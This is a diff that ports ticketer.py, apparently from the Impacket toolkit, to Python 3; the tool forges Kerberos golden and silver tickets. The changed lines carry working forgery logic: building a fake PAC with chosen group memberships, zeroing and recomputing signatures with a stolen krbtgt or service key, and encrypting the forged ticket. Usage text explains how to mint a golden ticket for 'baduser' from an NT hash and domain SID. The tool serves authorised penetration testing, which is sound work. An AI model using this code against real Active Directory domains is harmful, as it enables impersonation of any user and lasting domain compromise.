@@ -40,6 +40,8 @@
 # [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
 # [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
+from __future__ import division
+from __future__ import print_function
 import argparse
 import datetime
 import logging
@@ -54,7 +56,6 @@ from pyasn1.codec.der import encoder, decoder
 from pyasn1.type.univ import noValue
 
 from impacket import version
-from impacket.winregistry import hexdump
 from impacket.dcerpc.v5.dtypes import RPC_SID
 from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
@@ -161,11 +162,11 @@ class TICKETER:
             kerbdata['GroupIds'].append(groupMembership)
 
         kerbdata['UserFlags'] = 0
-        kerbdata['UserSessionKey'] = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
         kerbdata['LogonServer'] = ''
         kerbdata['LogonDomainName'] = self.__domain.upper()
         kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
-        kerbdata['LMKey'] = '\x00\x00\x00\x00\x00\x00\x00\x00'
+        kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
         kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
         kerbdata['SubAuthStatus'] = 0
         kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
@@ -194,11 +195,11 @@ class TICKETER:
         if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:
             srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
             privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
-            srvCheckSum['Signature'] = '\x00' * 16
-            privCheckSum['Signature'] = '\x00' * 16
+            srvCheckSum['Signature'] = b'\x00' * 16
+            privCheckSum['Signature'] = b'\x00' * 16
         else:
-            srvCheckSum['Signature'] = '\x00' * 12
-            privCheckSum['Signature'] = '\x00' * 12
+            srvCheckSum['Signature'] = b'\x00' * 12
+            privCheckSum['Signature'] = b'\x00' * 12
             if len(self.__options.aesKey) == 64:
                 srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
                 privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
@@ -366,11 +367,11 @@ class TICKETER:
         encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']
 
         if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(16)])
+            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
         elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(32)])
+            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
         else:
-            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(16)])
+            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
 
         encTicketPart['crealm'] = self.__domain.upper()
         encTicketPart['cname'] = noValue
@@ -394,7 +395,7 @@ class TICKETER:
         encTicketPart['authorization-data'][0]['ad-data'] = noValue
 
         # Let's locate the KERB_VALIDATION_INFO and Checksums
-        if pacInfos.has_key(PAC_LOGON_INFO):
+        if PAC_LOGON_INFO in pacInfos:
             data = pacInfos[PAC_LOGON_INFO]
             validationInfo = VALIDATION_INFO()
             validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
@@ -462,7 +463,7 @@ class TICKETER:
         logging.info('\tPAC_LOGON_INFO')
 
         # Let's now clear the checksums
-        if pacInfos.has_key(PAC_SERVER_CHECKSUM):
+        if PAC_SERVER_CHECKSUM in pacInfos:
             serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
             if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                 serverChecksum['Signature'] = '\x00' * 12
@@ -474,7 +475,7 @@ class TICKETER:
         else:
             raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')
 
-        if pacInfos.has_key(PAC_PRIVSVR_CHECKSUM):
+        if PAC_PRIVSVR_CHECKSUM in pacInfos:
             privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
             privSvrChecksum['Signature'] = '\x00' * 12
             if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
@@ -487,7 +488,7 @@ class TICKETER:
         else:
             raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')
 
-        if pacInfos.has_key(PAC_CLIENT_INFO_TYPE):
+        if PAC_CLIENT_INFO_TYPE in pacInfos:
             pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])
             pacClientInfo['ClientId'] = unixTime
             pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()
@@ -512,10 +513,10 @@ class TICKETER:
         encRepPart['nonce'] = 123456789
         encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
         encRepPart['flags'] = encodeFlags(flags)
-        encRepPart['authtime'] = encTicketPart['authtime']
-        encRepPart['endtime'] = encTicketPart['endtime']
-        encRepPart['starttime'] = encTicketPart['starttime']
-        encRepPart['renew-till'] = encTicketPart['renew-till']
+        encRepPart['authtime'] = str(encTicketPart['authtime'])
+        encRepPart['endtime'] = str(encTicketPart['endtime'])
+        encRepPart['starttime'] = str(encTicketPart['starttime'])
+        encRepPart['renew-till'] = str(encTicketPart['renew-till'])
         encRepPart['srealm'] = self.__domain.upper()
         encRepPart['sname'] = noValue
         encRepPart['sname']['name-string'] = noValue
@@ -537,60 +538,60 @@ class TICKETER:
 
         # We changed everything we needed to make us special. Now let's repack and calculate checksums
         validationInfoBlob = pacInfos[PAC_LOGON_INFO]
-        validationInfoAlignment = '\x00' * (((len(validationInfoBlob) + 7) / 8 * 8) - len(validationInfoBlob))
+        validationInfoAlignment = b'\x00' * (((len(validationInfoBlob) + 7) // 8 * 8) - len(validationInfoBlob))
 
         pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
-        pacClientInfoAlignment = '\x00' * (((len(pacClientInfoBlob) + 7) / 8 * 8) - len(pacClientInfoBlob))
+        pacClientInfoAlignment = b'\x00' * (((len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))
 
         serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
-        serverChecksumBlob = str(pacInfos[PAC_SERVER_CHECKSUM])
-        serverChecksumAlignment = '\x00' * (((len(serverChecksumBlob) + 7) / 8 * 8) - len(serverChecksumBlob))
+        serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]
+        serverChecksumAlignment = b'\x00' * (((len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))
 
         privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
-        privSvrChecksumBlob = str(pacInfos[PAC_PRIVSVR_CHECKSUM])
-        privSvrChecksumAlignment = '\x00' * (((len(privSvrChecksumBlob) + 7) / 8 * 8) - len(privSvrChecksumBlob))
+        privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]
+        privSvrChecksumAlignment = b'\x00' * (((len(privSvrChecksumBlob) + 7) // 8 * 8) - len(privSvrChecksumBlob))
 
         # The offset are set from the beginning of the PAC_TYPE
         # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(str(PAC_INFO_BUFFER())) * 4
+        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * 4
 
         # Let's build the PAC_INFO_BUFFER for each one of the elements
         validationInfoIB = PAC_INFO_BUFFER()
         validationInfoIB['ulType'] = PAC_LOGON_INFO
         validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
         validationInfoIB['Offset'] = offsetData
-        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) / 8 * 8
+        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8
 
         pacClientInfoIB = PAC_INFO_BUFFER()
         pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
         pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
         pacClientInfoIB['Offset'] = offsetData
-        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) / 8 * 8
+        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8
 
         serverChecksumIB = PAC_INFO_BUFFER()
         serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
         serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
         serverChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) / 8 * 8
+        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8
 
         privSvrChecksumIB = PAC_INFO_BUFFER()
         privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
         privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
         privSvrChecksumIB['Offset'] = offsetData
-        # offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
+        # offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) //8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
-            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
-            pacInfos[PAC_CLIENT_INFO_TYPE]) + pacClientInfoAlignment
-        buffersTail = str(serverChecksumBlob) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
+            privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
+            pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
+        buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
 
         pacType = PACTYPE()
         pacType['cBuffers'] = 4
         pacType['Version'] = 0
         pacType['Buffers'] = buffers + buffersTail
 
-        blobToChecksum = str(pacType)
+        blobToChecksum = pacType.getData()
 
         checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
         if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
@@ -617,20 +618,20 @@ class TICKETER:
         privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])
         logging.info('\tPAC_PRIVSVR_CHECKSUM')
 
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
         authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
-        authorizationData[0]['ad-data'] = str(pacType)
+        authorizationData[0]['ad-data'] = pacType.getData()
         authorizationData = encoder.encode(authorizationData)
 
         encTicketPart['authorization-data'][0]['ad-data'] = authorizationData
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Customized EncTicketPart')
-            print encTicketPart.prettyPrint()
+            print(encTicketPart.prettyPrint())
             print ('\n')
 
         encodedEncTicketPart = encoder.encode(encTicketPart)
@@ -650,7 +651,7 @@ class TICKETER:
         # key or application session key), encrypted with the
         # service key (Section 5.3)
         logging.info('\tEncTicketPart')
-        cipherText = cipher.encrypt(key, 2, str(encodedEncTicketPart), None)
+        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)
 
         kdcRep['ticket']['enc-part']['cipher'] = cipherText
         kdcRep['ticket']['enc-part']['kvno'] = 2
@@ -664,17 +665,17 @@ class TICKETER:
             # AS-REP encrypted part (includes TGS session key or
             # application session key), encrypted with the client key
             # (Section 5.4.2)
-            sessionKey = Key(cipher.enctype, str(encASorTGSRepPart['key']['keyvalue']))
+            sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())
             logging.info('\tEncASRepPart')
-            cipherText = cipher.encrypt(sessionKey, 3, str(encodedEncASRepPart), None)
+            cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)
         else:
             # Key Usage 8
             # TGS-REP encrypted part (includes application session
             # key), encrypted with the TGS session key
             # (Section 5.4.2)
-            sessionKey = Key(cipher.enctype, str(encASorTGSRepPart['key']['keyvalue']))
+            sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())
             logging.info('\tEncTGSRepPart')
-            cipherText = cipher.encrypt(sessionKey, 8, str(encodedEncASRepPart), None)
+            cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)
 
         kdcRep['enc-part']['cipher'] = cipherText
         kdcRep['enc-part']['etype'] = cipher.enctype
@@ -682,7 +683,7 @@ class TICKETER:
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Final Golden Ticket')
-            print kdcRep.prettyPrint()
+            print(kdcRep.prettyPrint())
             print ('\n')
 
         return encoder.encode(kdcRep), cipher, sessionKey
@@ -708,7 +709,7 @@ class TICKETER:
 if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
                                                                 "user options")
@@ -743,18 +744,18 @@ if __name__ == '__main__':
 
     if len(sys.argv)==1:
         parser.print_help()
-        print "\nExamples: "
-        print "\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
-        print "\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4."
-        print "\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256"
-        print "\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as"
-        print "\tbaduser.ccache.\n"
-        print "\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " \
-              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n"
-        print "\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used"
-        print "\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,"
-        print "\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'"
-        print "\tand saved as baduser.ccache"
+        print("\nExamples: ")
+        print("\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n")
+        print("\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.")
+        print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
+        print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
+        print("\tbaduser.ccache.\n")
+        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
+              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
+        print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
+        print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
+        print("\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'")
+        print("\tand saved as baduser.ccache")
         sys.exit(1)
 
     options = parser.parse_args()
@@ -789,8 +790,8 @@ if __name__ == '__main__':
     try:
         executer = TICKETER(options.target, password, options.domain, options)
         executer.run()
-    except Exception, e:
+    except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
-        print str(e)
+        print(str(e))
